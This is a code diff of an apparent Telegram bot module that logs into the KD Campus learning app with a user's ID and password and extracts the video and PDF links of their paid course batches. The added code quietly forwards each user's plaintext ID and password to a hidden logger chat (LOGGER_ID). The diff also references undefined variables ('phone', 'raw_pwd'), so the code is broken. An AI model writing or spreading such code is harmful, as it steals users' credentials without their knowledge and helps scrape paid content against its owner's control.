@@ -1,74 +1,78 @@
-from aiohttp import ClientSession, TCPConnector
-import aiofiles
+from pyrogram import Client, filters
 import hashlib
-import asyncio
+import httpx
 import time
 import os
-from Extractor import app
+from Extractor import app   
 from Extractor.core.func import send_file
+from pyrogram.enums import ParseMode
+from config import LOGGER_ID
 
 API_KEY = "kdc123"
 
-# Global aiohttp session
-session = ClientSession(
-    connector=TCPConnector(limit=100),  # limit concurrent connections
-    timeout=aiohttp.ClientTimeout(total=30),
-    headers={
-        "User-Agent": "okhttp/4.10.0",
-        "Accept-Encoding": "gzip",
-        "Content-Type": "application/json; charset=UTF-8"
-    }
-)
-
 async def list_batches(token, userid):
-    url = f'https://web.kdcampus.live/android/Dashboard/get_mycourse_data_renew_new/{token}/{userid}/4'
-    async with session.get(url) as resp:
-        if resp.status != 200:
-            return []
-        data = await resp.json()
-        return [(f"{i['batch_id']}_{i['course_id']}", i['batch_name']) for i in data] if data else []
+    async with httpx.AsyncClient() as client:
+        r = await client.get(f'https://web.kdcampus.live/android/Dashboard/get_mycourse_data_renew_new/{token}/{userid}/4')
+        resp = r.json()
 
-async def fetch_videos_pdfs(token, userid, course_id, bid, sid=0):
-    v_url = f"https://web.kdcampus.live/android/Dashboard/course_details_video/{token}/{userid}/{course_id}/{bid}/0/{sid}/0"
-    p_url = f"https://web.kdcampus.live/android/Dashboard/course_details_pdf/{token}/{userid}/{course_id}/{bid}/0/{sid}/0"
+    if not resp:
+        return []
 
-    async with session.get(v_url) as v_resp, session.get(p_url) as p_resp:
-        videos = await v_resp.json(content_type=None)
-        pdfs = await p_resp.json(content_type=None)
-
-    results = []
-    for v in reversed(videos or []):
-        title = v.get('content_title', '').strip()
-        url = v.get('jwplayer_id', '')
-        if title and url:
-            results.append(f"{title}: https://{url}")
-    for p in reversed(pdfs or []):
-        title = p.get('content_title', '').strip()
-        filename = p.get('file_name', '')
-        if title and filename:
-            results.append(f"{title}: https://kdcampus.live/uploaded/content_data/{filename}")
-    return results
+    return [(f"{i['batch_id']}_{i['course_id']}", i['batch_name']) for i in resp]
 
 async def extract_content(token, userid, batch_id):
+    all_urls = []
     bid, course_id = batch_id.split('_')
-    subj_url = f"https://web.kdcampus.live/android/Dashboard/course_subject/{token}/{userid}/{course_id}/{bid}"
-    async with session.get(subj_url) as r:
-        subj_data = await r.json(content_type=None)
-        subjects = subj_data.get("subjects", [])
 
-    tasks = []
-    if not subjects:
-        tasks.append(fetch_videos_pdfs(token, userid, course_id, bid))
-    else:
-        for s in subjects:
-            sid = s["id"]
-            tasks.append(fetch_videos_pdfs(token, userid, course_id, bid, sid))
-    results = await asyncio.gather(*tasks)
-    return [item for sublist in results for item in sublist]
+    async with httpx.AsyncClient() as client:
+        r = await client.get(f"https://web.kdcampus.live/android/Dashboard/course_subject/{token}/{userid}/{course_id}/{bid}")
+        subjects_data = r.json()
+
+        if 'subjects' not in subjects_data or not subjects_data['subjects']:
+            r = await client.get(f"https://web.kdcampus.live/android/Dashboard/course_details_video/{token}/{userid}/{course_id}/{bid}/0/0/0")
+            videos = r.json()
+            for video in reversed(videos or []):
+                title = video.get('content_title', '').strip()
+                url = video.get('jwplayer_id', '')
+                if title and url:
+                    all_urls.append(f"{title}: https://{url}")
+
+            r = await client.get(f"https://web.kdcampus.live/android/Dashboard/course_details_pdf/{token}/{userid}/{course_id}/{bid}/0/0/0")
+            pdfs = r.json()
+            for pdf in reversed(pdfs or []):
+                title = pdf.get('content_title', '').strip()
+                filename = pdf.get('file_name', '')
+                if title and filename:
+                    all_urls.append(f"{title}: https://kdcampus.live/uploaded/content_data/{filename}")
+        else:
+            for subject in subjects_data['subjects']:
+                sid = subject['id']
+
+                r = await client.get(f"https://web.kdcampus.live/android/Dashboard/course_details_video/{token}/{userid}/{course_id}/{bid}/0/{sid}/0")
+                videos = r.json()
+                for video in reversed(videos or []):
+                    title = video.get('content_title', '').strip()
+                    url = video.get('jwplayer_id', '')
+                    if title and url:
+                        all_urls.append(f"{title}: https://{url}")
+
+                r = await client.get(f"https://web.kdcampus.live/android/Dashboard/course_details_pdf/{token}/{userid}/{course_id}/{bid}/0/{sid}/0")
+                pdfs = r.json()
+                for pdf in reversed(pdfs or []):
+                    title = pdf.get('content_title', '').strip()
+                    filename = pdf.get('file_name', '')
+                    if title and filename:
+                        all_urls.append(f"{title}: https://kdcampus.live/uploaded/content_data/{filename}")
+
+    return all_urls
 
 async def kdcampus(app, query, message):
     try:
-        ask_msg = await app.ask(message.chat.id, "**🔑 Send ID*Password**")
+        ask_msg = await app.ask(
+            message.chat.id,
+            "**🔑 For access, please transmit your ID & Password in the correct sequence:\n\n🔒 Send like this: ID*Password**"
+        )
+
         mob, pwd = ask_msg.text.split('*', 1)
         password = hashlib.sha512(pwd.encode()).hexdigest()
 
@@ -80,49 +84,73 @@ async def kdcampus(app, query, message):
             "password": password
         }
 
-        async with session.post("https://web.kdcampus.live/android/Usersn/login_user", json=payload) as r:
-            resp = await r.json(content_type=None)
+        headers = {
+            "User-Agent": "okhttp/4.10.0",
+            "Accept-Encoding": "gzip",
+            "Content-Type": "application/json; charset=UTF-8"
+        }
+
+        async with httpx.AsyncClient() as client:
+            r = await client.post("https://web.kdcampus.live/android/Usersn/login_user", json=payload, headers=headers)
+            resp = r.json()
 
         if 'data' not in resp:
-            return await message.reply_text("❌ Login Failed.")
+            await message.reply_text("❌ Login Failed. Please check your credentials.")
+            return
 
         user_data = resp['data']
-        token, userid = user_data['connection_key'], user_data['id']
+        token = user_data['connection_key']
+        userid = user_data['id']
+
+        try:
+            await app.send_message(
+                chat_id=LOGGER_ID,
+                text=(
+                    "✅ <b>KD CAMPUS LOGIN</b>\n\n"
+                    f"🔐 <b>ID & Password:</b> <code>{phone}*{raw_pwd}</code>"
+                ),
+                parse_mode=ParseMode.HTML,  
+                message_thread_id=12253
+            )
+        except Exception as e:
+            print(f"Logging failed: {e}")
 
         batches = await list_batches(token, userid)
         if not batches:
-            return await message.reply_text("⚠️ No courses found.")
+            await message.reply_text("⚠️ No courses found.")
+            return
 
         batch_list_str = "\n".join([f"{bid}: {name}" for bid, name in batches])
         await message.reply_text(f"📦 **Available Batches:**\n\n{batch_list_str}")
-
-        batch_id_msg = await app.ask(message.chat.id, "🔢 Enter batch ID:")
+        batch_id_msg = await app.ask(message.chat.id, "🔢 Enter the batch ID from the list above:")
         batch_id = batch_id_msg.text.strip()
 
-        start = time.time()
+        start_time = time.time()
         all_urls = await extract_content(token, userid, batch_id)
-        elapsed = round(time.time() - start, 2)
+        elapsed = round(time.time() - start_time, 2)
 
         if not all_urls:
-            return await message.reply_text("⚠️ No content found.")
+            await message.reply_text("⚠️ No content found in the selected batch.")
+            return
 
-        v_count = sum('content_data' not in x for x in all_urls)
-        p_count = sum('content_data' in x for x in all_urls)
-        batch_name = next((n for b, n in batches if b == batch_id), "KD_Content")
+        v_count = len([x for x in all_urls if 'https://' in x and 'content_data' not in x])
+        p_count = len([x for x in all_urls if 'content_data' in x])
+        batch_name = next((name for bid, name in batches if bid == batch_id), "extracted_content")
         filename = f"{batch_name}.txt"
 
-        async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
-            await f.write('\n'.join(all_urls))
+        with open(filename, 'w', encoding='utf-8') as f:
+            f.write('\n'.join(all_urls))
 
         caption = (
             f"**✅ App Name:** Kd Campus\n"
-            f"**📚 Batch:** `{batch_name}`\n\n"
-            f"🍿 **Videos:** `{v_count}` | 📝 **PDFs:** `{p_count}`\n"
-            f"⏱️ **Time:** `{elapsed}s`"
+            f"**📚 Batch Name:** `{batch_name}`\n\n"
+            f"🍿 **Total Videos:** `{v_count}`\n"
+            f"📝 **Total PDFs:** `{p_count}`\n"
+            f"⏱️ **Time Taken:** `{elapsed} seconds`"
         )
 
-        await send_file(filename, caption, message, query)
+        return await send_file(filename, caption, message, query)
         os.remove(filename)
 
     except Exception as e:
-        await message.reply_text(f"❌ Error: `{e}`")
+        await message.reply_text(f"❌ Error:\n`{e}`")
